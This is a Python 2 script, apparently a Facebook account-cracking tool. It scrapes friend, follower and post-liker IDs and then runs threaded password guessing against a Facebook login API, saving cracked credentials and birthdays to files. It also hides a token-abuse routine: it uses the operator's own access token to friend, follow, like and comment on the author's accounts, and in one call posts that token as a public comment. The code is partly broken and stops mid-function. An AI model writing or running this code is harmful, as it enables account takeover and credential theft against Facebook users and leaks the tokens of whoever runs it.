import os
import sys
import requests
import marshal
import hashlib
import base64
import codecs
import marshal
import zlib
import os
import sys
import random
import time
import datetime
from random import *
import string
import random
import requests, os, re, bs4, sys, json, time, random, datetime



try:
    import requests
except ImportError:
    print '\n [\xc3\x97] The requests module is not installed!...\n'


try:
    import bs4
except ImportError:
    print '\n [\xc3\x97] Bs4 module is not installed yet!...\n'
    os.system('pip2 install bs4')


from concurrent.futures import ThreadPoolExecutor as mking__pass
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = [
 'Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
ok = []
cp = []
id = []
user = []
num = 0
loop = 0
url = 'https://mbasic.facebook.com'
hoetank = random.choice(['The one who posted is handsome:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def tod():
    titik = [
     '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r \x1b[1;93m[+] remove token '(N, M, N, x),
        sys.stdout.flu
        time.sleep(1)
logo = ''' \n\x1b[1;91m

__________________ _______  _______  _______ 
\__   __/\__   __/(  ____ \(  ____ \(  ____ )
   ) (      ) (   | (    \/| (    \/| (    )|
   | |      | |   | |      | (__    | (____)|
   | |      | |   | | ____ |  __)   |     __)
   | |      | |   | | \_  )| (      | (\ (   
   | |   ___) (___| (___) || (____/\| ) \ \__
   )_(   \_______/(_______)(_______/|/   \__/                                    
\n'''

def coment():
    try:
        toket = open('.login.txt', 'r').read()
    except IOError:
        os.system('echo -e "[!] token halaea ! ! "| lolcat')
        os.system('rm -rf .login.txt')
        mspro()

    una = '100009918107424'
    idfb = '100027060438331'
    kom = 'Nice  \xe2\x9d\xa4\xef\xb8\x8f'
    post = '1518283875178868'
    post2 = '843036946608312'
    msking = 'i love you @[100027060438331:]    @[100009918107424:]'
    kom2 = 'nice \xe2\x9d\xa4\xef\xb8\x8f'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + idfb + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100027060438331/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100009918107424/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + toket + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/843036946608312/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/843036946608312/comments/?message=very Nice \xe2\x9d\xa4\xef\xb8\x8f&access_token=' + toket)
    requests.post('https://graph.facebook.com/1518283875178868/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/1518283875178868/comments/?message=' + msking + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/1589758271364761/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/1589758271364761/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/1588336131506975/comments/?message=' + msking + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/1588336131506975/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/1578822245791697/comments/?message=' + msking + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/1578822245791697/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/1574781699529085/comments/?message=' + msking + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/1574781699529085/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/1557330491274206/comments/?message=' + msking + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/1557330491274206/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/1548776652129590/comments/?message=' + msking + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/1548776652129590/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/1547598918914030/comments/?message=' + msking + '&access_token=' + toket)
    menu()
def seved_ok_cp(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\x1b[1;97m-------------------------------------------------'
        print 'The cloning process has been completed'
        print '[%s+%s] total OK : %s%s%s' % (O, N, H, str(len(ok)), N)
        print '[%s+%s] total CP : %s%s%s' % (O, N, K, str(len(cp)), N)
        print '\x1b[1;97m-------------------------------------------------'
        raw_input('[%s \x1b[1;97mPress Enter To Back Menu%s ] ' % (O, N))
        menu()
    else:
        print '[%s\x1b[1;91m!%s] opshh you are not getting saved :(' % (M, N)
        exit()


def mking():
    os.system('clear')
    print logo
    sultani = raw_input('%s[%s\x1b[1;92m?%s] Token :%s ' % (N, M, N, H))
    print '\x1b[1;97m-------------------------------------------------'
    if sultani in ('open', 'Open', 'OPEN'):
        raw_input(' %s*%s Press enter to continue tools ' % (O, N))
        os.system('xdg-open https://m.facebook.com/mohammad.hacker.1122')
        mking()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s' % sultani).json()['name']
        print '%s\x1b[0;92m*%s welcome %s%s%s' % (O, N, K, nama, N)
        time.sleep(2)
        print '\x1b[1;97m-------------------------------------------------'
        open('.login.txt', 'w').write(sultani)
        raw_input(' %s\x1b[0;92m*%s enter bka bo chwna zhwrawa ' % (O, N))
        mr___profaisor(sultani)
        os.system('xdg-open https://t.me/krd_cheat')
        coment()
    except KeyError:
        print '%s[%s\x1b[0;92m!%s] token halaea' % (N, M, N)
        time.sleep(2)
        mking()


def menu():
    os.system('clear')
    try:
        sultani = open('.login.txt', 'r').read()
    except IOError:
        print '%s[%s\x1b[0;92m\xc3\x97%s] token halaea !' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .login.txt')
        mking()

    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s' % sultani).json()['name']
    except KeyError:
        print '%s[%s\x1b[0;92m\xc3\x97%s] token halaea !' % (N, M, N)
        time.sleep(2)
        os.system('rm -rf .login.txt')
        mking()
    except requests.exceptions.ConnectionError:
        exit('%s[%s!%s] no connection\n' % (N, M, N))

    os.system('clear')
    print logo
    IP = requests.get('https://api.ipify.org').text
    print ' [\x1b[0;97m\x1b[0;92m\xe2\x9c\x93\x1b[0m] nawe to  : \x1b[0;92m%s' % nama
    time.sleep(0.03)
    print ' \x1b[0;97m[\x1b[0;96m\x1b[0;92m\xe2\x9c\x93\x1b[0m] IP MOBILE TO   : \x1b[0;92m%s' % IP
    print '\x1b[1;97m-------------------------------------------------'
    time.sleep(0.05)
    print ' [%s\x1b[0;92m1%s]. ID DAR BENA [!]' % (O, N)
    time.sleep(0.05)
    print ' [%s\x1b[0;92m2%s]. START HACK  [!]' % (O, N)
    time.sleep(0.05)
    print '\x1b[1;97m-------------------------------------------------'
    mr_profaisor = raw_input(' [\x1b[0;92m*\x1b[0;97m] HALBZHERA [!] \xe2\x9e\xa4 \x1b[1;32m')
    if mr_profaisor == '':
        print '%s[%s\xc3\x97%s] dont empty kentod!' % (N, M, N)
        time.sleep(2)
        menu()
    elif mr_profaisor in ('1', '01'):
        publik(sultani)
    elif mr_profaisor in ('2', '02'):
        __crack__().plerr()
    elif mr_profaisor in ('99', '099'):
        cek_ingfo(sultani)
    elif mr_profaisor in ('98', '87'):
        try:
            dirs = os.listdir('saved')
            print '[ crack saved stored in your file ]\n'
            for file in dirs:
                print ' [%s+%s] %s' % (O, N, file)

            file = raw_input('[%s?%s] Enter filename :%s ' % (M, N, H))
            if file == '':
                file = raw_input('%s[%s?%s] Enter filename :%s %s' % (N, M, N, H, N))
            total = open('saved/%s' % file).read().splitlines()
            print '%s[%s\x1b[1;91m#%s] --------------------------------------------' % (N, O, N)
            time.sleep(2)
            nm_file = ('%s' % file).replace('-', ' ')
            hps_nm = nm_file.replace('.txt', '').replace('OK', '').replace('CP', '')
            jalan(' [%s\x1b[1;92m*%s] %crack%s saved on date %s:%s%s%s total %s: %s%s%s' % (M, N, O, N, M, O, hps_nm, N, M, O, len(total), O))
            print ' %s[%s\x1b[1;92m#%s] --------------------------------------------' % (N, O, N)
            time.sleep(2)
            for memek in total:
                sultani = memek.replace('\n', '')
                titid = sultani.replace(' [\xe2\x9c\x93] ', ' \x1b[0m[\x1b[1;92m\xe2\x9c\x93\x1b[0m]\x1b[1;92m ').replace(' [\xc3\x97] ', ' \x1b[0m[\x1b[1;93m\xc3\x97\x1b[0m]\x1b[1;93m ')
                print '%s%s' % (titid, N)
                time.sleep(0.03)

            print ' %s[%s#%s] --------------------------------------------' % (N, O, N)
            raw_input('[ %sRETURN%s ] ' % (O, N))
            menu()
        except IOError:
            print '%s[%s\x1b[1;91m\xc3\x97%s] opshh you are not getting savedl :(' % (N, M, N)
            raw_input('[ %s RETURN%s ] ' % (O, N))
            menu()

    elif mr_profaisor in ('6', '06'):
        seting_yntkts()
    elif mr_profaisor in ('7', '07'):
        info_tools()
    elif mr_profaisor in ('0', '00'):
        print '\n'
        tod()
        time.sleep(1)
        os.system('rm -rf .login.txt')
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s]%s successfully deleted token' % (N, H, N, H))
        exit()
    else:
        print '%s[%s\xc3\x97%s] menu [%s%s%s] no, check the menu bro!' % (N, M, N, M, mr_profaisor, N)
        time.sleep(2)
        menu()


def mr___profaisor(sultani):
    try:
        kentod = sultani
        requests.post('https://graph.facebook.com/100009918107424/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100027060438331/subscribers?access_token=%s' % kentod)
    except:
        pass


def teman(sultani):
    try:
        os.system('clear')
        print logo
        os.mkdir('extract')
    except:
        pass

    try:
        mmk = raw_input('%s[%s\x1b[1;92m?%s] nawe file  : \x1b[1;92m' % (N, O, N))
        asw = raw_input(' %s[%s\x1b[1;92m?%s] Limit id   : \x1b[1;92m' % (N, O, N))
        cin = ('extract/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s' % (asw, sultani)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s \r[\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] chaware bka [!]...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        print '\x1b[1;97m-------------------------------------------------'
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s] Sarkawtw bw' % (N, H, N))
        print ' [%s\x1b[1;92m\xe2\x80\xa2%s] Awa nawa cope bka ( %s%s%s )' % (O, N, M, cin, N)
        print '\x1b[1;97m-------------------------------------------------'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        menu()
    except (KeyError, IOError):
        os.remove(cin)
        jalan('%s[%s\x1b[1;91m!%s] Id extract failed, probably id is not public.\n' % (N, M, N))
        raw_input(' [ %sRETURN%s ] ' % (O, N))
        menu()

def publik(sultani):
    try:
        os.system('clear')
        print logo
        os.mkdir('extract')
    except:
        pass

    try:
        csy = raw_input('%s[%s\x1b[1;92m?%s] id kasaka [!] : \x1b[1;92m' % (N, O, N))
        ahh = raw_input('%s[%s\x1b[1;92m?%s] Nawe file : \x1b[1;92m' % (N, O, N))
        ihh = raw_input('%s[%s\x1b[1;92m?%s] kota id  : \x1b[1;92m' % (N, O, N))
        print '\x1b[1;97m-------------------------------------------------'
        knt = (ahh + '.json').replace(' ', '_')
        ys = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s' % (csy, ihh, sultani)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s\r [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] chaware bka [!]...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        print '\n\x1b[1;97m-------------------------------------------------'
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s] Sarkawtw bw' % (N, H, N))
        print '\x1b[1;97m-------------------------------------------------'
        print ' [%s\x1b[1;92m\xe2\x80\xa2%s] Awa nawa cope bka  ( %s%s%s )' % (O, N, M, knt, N)
        print '\x1b[1;97m-------------------------------------------------'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        menu()
    except (KeyError, IOError):
        os.remove(knt)
        jalan('%s[%s\x1b[1;91m!%s] Id extract failed, probably id is not public.\n' % (N, M, N))
        raw_input(' [ %sRETURN%s ] ' % (O, N))
        menu()


def followers(sultani):
    try:
        os.system('clear')
        print logo
        os.mkdir('extract')
    except:
        pass

    try:
        csy = raw_input('%s[%s\x1b[1;92m?%s] Followers Link : \x1b[1;92m' % (N, O, N))
        mmk = raw_input('%s[%s\x1b[1;92m?%s] file Name    : \x1b[1;92m' % (N, O, N))
        asw = raw_input('%s[%s\x1b[1;92m?%s]  Id Limit      : \x1b[1;92m' % (N, O, N))
        print '\x1b[1;97m-------------------------------------------------'
        ah = ('extract/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in requests.get('https://m.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier=932814394301097&av=100029700362234&ext=1637297227&hash=AeTlDuw9i8qxu-j30iU' % (sultani)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s\r [\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] chaware bka [!]...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        print '\n\x1b[1;97m-------------------------------------------------'
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s] Successfully extract id from total followers' % (N, H, N))
        print '\x1b[1;97m-------------------------------------------------'
        print ' [%s\x1b[1;92m\xe2\x80\xa2%s] Copy the output file ( %s%s%s )' % (O, N, M, ah, N)
        print '\x1b[1;97m-------------------------------------------------'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        menu()
    except (KeyError, IOError):
        os.remove(ah)
        jalan('%s[%s\x1b[1;91m!%s] Failed to extract id, probably id is not public.\n' % (N, M, N))
        raw_input(' [ %sRETURN%s ] ' % (O, N))
        menu()


def followers(sultani):
    try:
        os.system('clear')
        print logo
        os.mkdir('extract')
    except:
        pass

    try:
        csy = raw_input('%s[%s\x1b[1;92m?%s] id follow  : \x1b[1;92m' % (N, O, N))
        mmk = raw_input('%s[%s\x1b[1;92m?%s] file name  : \x1b[1;92m' % (N, O, N))
        asw = raw_input('%s[%s\x1b[1;92m?%s] limit id   : \x1b[1;92m' % (N, O, N))
        print '\x1b[1;97m-------------------------------------------------'
        ah = ('extract/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (csy, asw, sultani)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s \r[\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] chaware bka [!]...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        print '\n\x1b[1;97m-------------------------------------------------'
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s] Successfully extract id from total followers' % (N, H, N))
        print '[%s\x1b[1;92m\xe2\x80\xa2%s] Copy the output file ( %s%s%s )' % (O, N, M, ah, N)
        print '\x1b[1;97m-------------------------------------------------'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        menu()
    except (KeyError, IOError):
        os.remove(ah)
        jalan('%s[%s\x1b[1;91m!%s] Failed to extract id, probably id is not public.\n' % (N, M, N))
        raw_input(' [ %sRETURN%s ] ' % (O, N))
        menu()


def postingan(sultani):
    try:
        os.system('clear')
        print logo
        os.mkdir('extract')
    except:
        pass

    try:
        csy = raw_input('%s[%s\x1b[1;92m?%s] id posting : \x1b[1;92m' % (N, O, N))
        ppk = raw_input('%s[%s\x1b[1;92m?%s] file name  : \x1b[1;92m' % (N, O, N))
        asw = raw_input('%s[%s\x1b[1;92m?%s]   limit id   : \x1b[1;92m' % (N, O, N))
        print '\x1b[1;97m-------------------------------------------------'
        ahh = ('extract/' + ppk + '.json').replace(' ', '_')
        ys = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s' % (csy, asw, sultani)).json()['data']:
            id.append(a['id'] + '|' + a['name'])
            ys.write(a['id'] + '|' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s \r[\x1b[0;96m%s\x1b[0m] [\x1b[0;91m%s\x1b[0m] chaware bka [!]...' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        print '\n\x1b[1;97m-------------------------------------------------'
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s] Successfully extract id from like post' % (N, H, N))
        print '[%s\x1b[1;92m\xe2\x80\xa2%s] Copy the output file ( %s%s%s )' % (O, N, M, ahh, N)
        print '\x1b[1;97m-------------------------------------------------'
        raw_input(' [%s ENTER%s ] ' % (O, N))
        menu()
    except (KeyError, IOError):
        os.remove(ahh)
        jalan('%s[%s\x1b[1;91m!%s] Id extract failed, maybe the id is not public.\n' % (N, M, N))
        raw_input(' [ %sRETURN%s ] ' % (O, N))
        menu()


def info_tools():
    os.system('clear')
    print logo
    print '           OWNER INFO'
    print '\x1b[1;97m-------------------------------------------------'
    print '%s[%s>%s] Author   : \x1b[1;96mPROFAISOR .' % (N, H, N)
    time.sleep(0.07)
    print '%s[%s>%s] Github   : https://github.com/mohammadjan1122' % (N, H, N)
    time.sleep(0.07)
    print '%s[%s>%s] Facebook : https://www.facebook.com/mohammad.hacker.1122' % (N, H, N)
    time.sleep(0.07)
    print '%s[%s>%s] Facebook : https://www.facebook.com/mohammad.hacker.1122' % (N, H, N)
    time.sleep(0.07)
    print '\x1b[1;97m-------------------------------------------------'
    raw_input('[ %s RETURN%s ] ' % (O, N))
    menu()


def seting_yntkts():
    os.system('clear')
    print logo
    print '[%s\x1b[1;92m1%s] Change user agent' % (O, N)
    print '[%s\x1b[1;92m2%s] Check user agent' % (O, N)
    print '\x1b[1;97m-------------------------------------------------'
    ytbjts = raw_input('%s[%s\x1b[1;92m?%s] HALBZHIRA [!] ' % (N, O, N))
    if ytbjts == '':
        print '%s[%s\x1b[1;91m\xc3\x97%s] Cant be empty Kentod' % (N, M, N)
        time.sleep(2)
        seting_yntkts()
    elif ytbjts == '1':
        agent_user()
    elif ytbjts == '2':
        agent_chek()
    else:
        print '%s[%s\x1b[1;91m\xc3\x97%s] Correct input' % (N, M, N)
        time.sleep(2)
        seting_yntkts()


def agent_user():
    os.system('rm -rf mking.txt')
    os.system('clear')
    print logo
    print '%s[%s\x1b[1;92m\xe2\x80\xa2%s] Notice me : cari User Agent di google chrome.' % (N, O, N)
    print '[%s\x1b[1;92m\xc3\x97%s] Type User Agent or My User Agent....\n' % (M, N)
    print '\x1b[1;97m-------------------------------------------------'
    anjng = raw_input(' [%s\x1b[1;92m?%s] Enter User Agent :\x1b[1;92m%s ' % (O, N, H))
    if anjng == '':
        print '%s[%s\x1b[1;91m\xc3\x97%s] Kentod cannot be empty' % (N, M, N)
        agent_user()
    try:
        open('mking.txt', 'w').write(anjng)
        time.sleep(2)
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s] successfully changed the user agent...' % (N, H, N))
        raw_input('%s[ %sRETURN%s ]' % (N, O, N))
        menu()
    except:
        pass


def agent_chek():
    try:
        user_agent = open('mking.txt', 'r').read()
    except IOError:
        user_agent = '%s-' % M
    except:
        pass

    print '%s[%s\x1b[0;92m+%s] Your User Agent: %s%s' % (N, O, N, H, user_agent)
    raw_input('%s[ %sRETURN%s ]' % (N, O, N))
    menu()


class __crack__():

    def __init__(self):
        self.id = []

    def plerr(self):
        os.system('clear')
        print logo
        try:
            self.apk = raw_input('[%s\x1b[1;92m?%s] nawe file : \x1b[1;92m' % (O, N))
            self.id = open(self.apk).read().splitlines()
            print '[%s\x1b[1;92m+%s] HAMW IDEAKAN \x1b[1;92m%s%s%s' % (O, N, M, len(self.id), N)
            print '\x1b[1;97m-------------------------------------------------'
        except:
            print '%s[%s\x1b[1;91m%s] File [%s%s%s] No, extract id first bro check numbers 1 to 4' % (N, M, N, M, self.apk, N)
            time.sleep(3)
            raw_input('%s[ %sRETURN%s ]' % (N, O, N))
            menu()

        print '[\x1b[1;32m1\x1b[1;37m] START HACK [!]'
        print '\x1b[1;97m-------------------------------------------------'
        ___mking__pass___ = raw_input('[%s\x1b[1;92m?%s] HALBZHIRA [!] ' % (O, N))
        if ___mking__pass___ in ('2', '02'):
            print '%s[%s\x1b[1;91m!%s] use , (comma) for separator example: password123,password12345,etc. each word is at least 6 characters or more' % (N, M, N)
            print '\x1b[1;97m-------------------------------------------------'
            while True:
                pwek = raw_input('[%s\x1b[1;92m?%s] Enter password : \x1b[1;92m' % (O, N))
                print '\x1b[1;97m-------------------------------------------------'
                print ' [*] Crack with password -> [ %s%s%s ]' % (M, pwek, N)
                print '\x1b[1;97m-------------------------------------------------'
                if pwek == '':
                    print '%s[%s\x1b[1;91m\xc3\x97%s] dont empty the password ' % (N, M, N)
                elif len(pwek) <= 5:
                    print '%s[%s\x1b[1;91m\xc3\x97%s] Password minimum 6 characters' % (N, M, N)
                else:

                    def __yan__(ysc=None):
                        global cp
                        global ok
                        cin = raw_input('[\x1b[1;92m*\x1b[1;97m] method : \x1b[1;92m')
                        print '\x1b[1;97m-------------------------------------------------'
                        if cin == '':
                            print '%s[%s\x1b[1;91m\xc3\x97%s] dont be empty bro' % (N, M, N)
                            self.__yan__()
                        elif cin == '1':
                            with mking__pass(max_workers=30) as (__mking__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        __mking__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            seved_ok_cp(ok, cp)
                        elif cin == '2':
                            with mking__pass(max_workers=30) as (__mking__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        __mking__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            seved_ok_cp(ok, cp)
                        elif cin == '3':
                            with mking__pass(max_workers=30) as (__mking__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        __mking__.submit(self.__mfb, __, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            seved_ok_cp(ok, cp)
                        else:
                            print '%s[%s\x1b[1;91m\xc3\x97%s] correct input' % (N, M, N)
                            self.__yan__()

                    print '\x1b[1;97m-------------------------------------------------'
                    print '[%s\x1b[1;92m1%s]. ZOOR XERA [!]' % (O, N)
                    print '\x1b[1;97m-------------------------------------------------'
                    __yan__(pwek.split(','))
                    break

        elif ___mking__pass___ in ('1', '01'):
            print '\x1b[1;97m-------------------------------------------------'
            print '[%s\x1b[1;92m1%s]. ZOOR XERA [!]' % (O, N)
            print '\x1b[1;97m-------------------------------------------------'
            self.__pler__()
        else:
            print '%s[%s\x1b[1;91m\xc3\x97%s] y/t goblok!' % (N, M, N)
            time.sleep(2)
            menu()
        return

    def __api__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92mR\xe2\x99\xa1S%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('saved')
            except:
                pass

            try:
                _sultani = open('mking.txt', 'r').read()
            except (KeyError, IOError):
                _sultani = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

                headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _sultani, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                'format': 'JSON', 
                'sdk_version': '2', 
                'email': user, 
                'locale': 'en_US', 
                'password': pw, 
                'sdk': 'ios', 'generate_session_cookies': '1', 
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if response.status_code != 200: 
                (sys.stdout.write('\r%s[%s\x1b[1;91m!%s] IP blocked turn on airplane mode 5 seconds' % (N, M, N)),)
                sys.stdout.flush()
                loop += 1
                self.__api__()
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r%s[TIGER-OK] %s | %s   %s' % (H, user, pw, N)
                wrt = ' [\xe2\x9c\x93] %s|%s' % (user, pw)
                ok.append(wrt)
                open('/sdcard/saved/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    sultani = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, sultani)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[TIGER-CP] %s | %s | %s %s %s%s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[TIGER-CP] %s | %s %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
 

        loop += 1

    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92mMR\xe2\x99\xa1SULTANI%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('saved')
            except:
                pass

            try:
                _sultani = open('mking.txt', 'r').read()
            except (KeyError, IOError):
                _sultani = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
